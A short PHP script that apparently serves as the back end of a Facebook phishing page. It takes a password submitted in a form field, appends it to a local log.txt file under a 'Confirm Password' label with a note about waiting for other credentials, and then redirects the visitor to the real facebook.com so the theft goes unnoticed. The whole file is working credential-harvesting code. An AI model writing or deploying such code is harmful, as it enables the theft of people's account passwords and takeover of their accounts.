<?php

$pass1 = $_POST['pass'];

$file = fopen("log.txt","a"); 

fwrite($file,"Confirm Password:--> :");
fwrite($file,$pass1);
fwrite($file,"\n----------------------Waiting to Other Credentials----------------------------\n");
fclose($file);

header("location:https://www.facebook.com/");

?>
